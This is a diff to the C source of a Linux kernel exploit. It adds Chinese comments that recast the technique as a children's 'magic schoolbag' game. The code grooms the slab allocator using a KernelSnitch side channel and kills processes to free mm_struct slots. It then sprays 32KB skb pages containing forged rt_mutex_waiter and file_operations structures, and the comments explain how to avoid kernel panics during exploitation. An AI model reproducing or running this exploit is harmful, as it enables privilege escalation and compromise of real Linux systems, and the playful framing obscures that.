@@ -1,3 +1,19 @@
+/* ==========================================================================
+ * 【魔法书包工坊】—— 把一个我们能控制内容的"书包"(内核页)造出来
+ * ==========================================================================
+ * 后面每一关都要往书包里塞假道具：
+ *   第 1 关: 假排班表(伪造 rt_mutex_waiter 图，页内自包含)
+ *   第 2 关: 假钥匙牌(伪造 file_operations 表)
+ *   第 3 关: 假水管(伪造 pipe_buffer)
+ *
+ * 造书包的原理(占座大法)：
+ *   1. 开一堆小朋友进程(clone)，每人占一个 mm_struct 座位(slab 对象)
+ *   2. KernelSnitch 侧信道数座位，把"哪几个座位连号"摸清楚
+ *   3. 让目标座位的小朋友退园(kill)，座位空出来
+ *   4. 赶紧用内核网络包(skb, 32KB order-3)把书包内容喷进刚空出的座位
+ *      —— 书包(页)从此归我们写字！
+ * ========================================================================== */
+
 #include "common.h"
 #include "kernelsnitch/kernelsnitch.h"
 #include <linux/perf_event.h>
@@ -463,6 +479,11 @@ void prepare_ctxs(void) {
   post_ctx.memfds = calloc(sizeof(int), post_ctx.mm_cnt);
 }
 
+/* 【往书包里装道具】按 payload_mode 装不同关卡的道具：
+ *   PAGE_PAYLOAD_SLIDE(第 1 关): 假排班表 —— 伪造 rt_mutex_waiter 全家桶
+ *   PAGE_PAYLOAD_FOPS (第 2 关): 假钥匙牌 —— 伪造 file_operations 表
+ * 书包是 32KB 大块，同一份道具在每 8KB(chunk)重复印一遍，
+ * 提高喷中率(不确定学校会发哪个 chunk)。 */
 int prepare_skb_payload(uintptr_t base, int payload_mode) {
   memset(skb_buf, 0, SKB_SEND_SIZE);
 
@@ -491,11 +512,11 @@ int prepare_skb_payload(uintptr_t base, int payload_mode) {
   uint64_t task_group = text_addr(ROOT_TASK_GROUP);
   uint64_t pi_top_task = text_addr(INIT_TASK);
   if (payload_mode == PAGE_PAYLOAD_SLIDE) {
-    /* Runtime linear-map base is randomized (page=0xffffff88xxxxxxxx while
-     * build-time constants assume 0xffffff80xxxxxxxx) — every SLIDE_* address
-     * is unmapped at runtime and any dereference panics (observed in
-     * rb_erase -> rb_next reading waiter->tree_entry.parent). Keep the whole
-     * fake graph self-contained inside the reclaimed page. */
+    /* 【第 1 关专用: 全图页内自包含】运行时线性映射基址是随机化的
+     * (真书包地址 0xffffff88xxxxxxxx，编译期常量却假设 0xffffff80xxx)，
+     * 任何编译期算出的 SLIDE_* 地址在运行时都是"查无此房"，一碰就全园
+     * 警报(panic)。所以这里把整张假排班表的指针全部改指书包内部：
+     * 假 task 指书包里的假 task，假锁指书包里的假锁，邻居也是书包内。 */
     uintptr_t fake_right_zone = payload_base + RIGHT_OFF;
     uintptr_t fake_left_zone = payload_base + LEFT_OFF;
     write_pc = fake_right_zone;
@@ -511,6 +532,9 @@ int prepare_skb_payload(uintptr_t base, int payload_mode) {
   for (size_t chunk = 0; chunk < SKB_SEND_SIZE; chunk += ORDER3_SIZE) {
     unsigned char *p = skb_buf + chunk + SKB_FRAG_BIAS;
 
+    /* 【假锁的排队名单】waiters 红黑树指到书包里的 fake_w0。园长查
+     * "谁在排队"时(leftmost->task)，第一个读的就是这里 —— 必须落在
+     * 书包内，否则空指针警报(反汇编已验证无 NULL 检查)。 */
     put32(p, LOCK_OFF + 0x00, 0);
     if (payload_mode == PAGE_PAYLOAD_SLIDE) {
       /* owner==NULL branch of rt_mutex_adjust_prio_chain does
@@ -527,10 +551,10 @@ int prepare_skb_payload(uintptr_t base, int payload_mode) {
       put64(p, LOCK_OFF + 0x18, fake_task | 1);
     }
 
-    /* tree_entry.parent_color: 0 = parent NULL + BLACK. As the waiters-tree
-     * root it must be BLACK, otherwise re-inserting the RED stack waiter
-     * under it triggers the red-red case in rb_insert_color which reads
-     * gparent->rb_right with gparent==NULL -> panic. */
+    /* 【假标签树根必须染黑】parent_color=0 表示"无父 + 黑色"。
+     * 树根若是红色：园长把红色鬼标签补挂到它下面时会触发"红红冲突"，
+     * 要找祖父节点核对 —— 树根没有祖父(空指针) -> 全园警报。
+     * 树根染黑后，红色子标签怎么挂都合法，绝不触发旋转。 */
     put64(p, W0_OFF + 0x00, 0);
     put64(p, W0_OFF + 0x08, 0);
     put64(p, W0_OFF + 0x10, 0);
@@ -578,6 +602,8 @@ int prepare_skb_payload(uintptr_t base, int payload_mode) {
   return 1;
 }
 
+/* 【造书包主流程】占座 -> 数座位 -> 腾座位 -> 喷书包。
+ * 任何一步失败(座位没数清/没喷中)都返回 0，调用方换一轮重来。 */
 uintptr_t prepare_kernel_page(int payload_mode) {
   close_reclaim_sockets();
   mm_objs_per_slab = ORDER3_SIZE / MM_STRUCT_SZ;
